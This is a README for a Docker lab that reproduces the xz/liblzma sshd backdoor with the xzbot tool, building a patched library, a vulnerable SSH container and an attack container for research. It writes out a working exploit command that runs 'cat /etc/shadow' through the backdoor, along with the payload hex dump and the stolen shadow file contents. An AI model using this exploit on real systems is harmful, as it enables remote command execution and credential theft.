# Docker testbed for [xzbot](https://github.com/amlweems/xzbot)

This testbed create a testbed for the xz sshd backdoor based on amlweems' incredible reverse engineering work on the xz backdoor.

## Usage

Docker compose will:
 1. Create a patched version of `liblzma.so.5.6.1` as described [here](https://github.com/amlweems/xzbot?tab=readme-ov-file#ed448-patch)
 2. Create a vulnerable container with openssh server, copying the patched `liblzma.so.5.6.1` 
 3. Create an attack container, with `xzbot` ready to be used.

***Build:***

```sh
make
```

***Execute the backdoor***

```sh
docker exec -it xzbackdoor-poc /xzbot/xzbot \
    -addr xzbackdoor-vulnerable:22 -seed 378103 \
    -cmd "cat /etc/shadow > /tmp/.xz"
00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|
00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|
00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000130  00 00 00 00 00 00 00 00  00 00 00 01 00 00 00 00  |................|
00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|
00000170  00 00 01 01 00 00 01 00  02 00 00 00 01 00 00 00  |................|
00000180  00 00 00 00 00 00 00 00  c6 c3 81 18 c4 e4 11 09  |................|
00000190  42 6b 4c db 75 86 70 11  74 02 03 0f fe 44 0d 21  |BkL.u.p.t....D.!|
000001a0  dd 6b 67 e1 24 68 10 ca  6b 34 c1 00 ff e8 b4 16  |.kg.$h..k4......|
000001b0  a0 d1 5a 55 4d 58 64 cb  32 a6 e8 8d 6e 7f 7d 35  |..ZUMXd.2...n.}5|
000001c0  0f 21 85 b7 62 ae c3 31  12 d5 eb de 69 23 7f 25  |.!..b..1....i#.%|
000001d0  bf 0d 1b 95 b8 a8 0d bf  26 c3 ba 6d a5 6f fc e0  |........&..m.o..|
000001e0  8d 86 67 d9 1f 69 fa 33  67 1c 33 01 77 0b 4c 45  |..g..i.3g.3.w.LE|
000001f0  68 ec 1e 0c 70 18 5a a5  50 ba c3 a1 4c 40 91 b4  |h...p.Z.P...L@..|
00000200  94 ce 35 f7 41 18 6f 43  02 a7 f9 45 87 95 7e 17  |..5.A.oC...E..~.|
00000210  73 c6 93 95 8f b3 92 18  fb cc 00 00 00 00 00 00  |s...............|
00000220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|
00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|
2024/04/01 21:16:26 ssh: handshake failed: EOF
```

***Check results***

```sh
docker exec -it xzbackdoor-vulnerable cat /tmp/.xz
root:*:19793:0:99999:7:::
daemon:*:19793:0:99999:7:::
bin:*:19793:0:99999:7:::
sys:*:19793:0:99999:7:::
sync:*:19793:0:99999:7:::
games:*:19793:0:99999:7:::
man:*:19793:0:99999:7:::
lp:*:19793:0:99999:7:::
mail:*:19793:0:99999:7:::
news:*:19793:0:99999:7:::
uucp:*:19793:0:99999:7:::
proxy:*:19793:0:99999:7:::
www-data:*:19793:0:99999:7:::
backup:*:19793:0:99999:7:::
list:*:19793:0:99999:7:::
irc:*:19793:0:99999:7:::
_apt:*:19793:0:99999:7:::
nobody:*:19793:0:99999:7:::
sshd:!:19814::::::
```

***Clean everything up***

```sh
make clean
```

## Further work

Compile a [patched openssh-portable](https://github.com/amlweems/xzbot?tab=readme-ov-file#honeypot) to create an honeypot and test the backdoor.
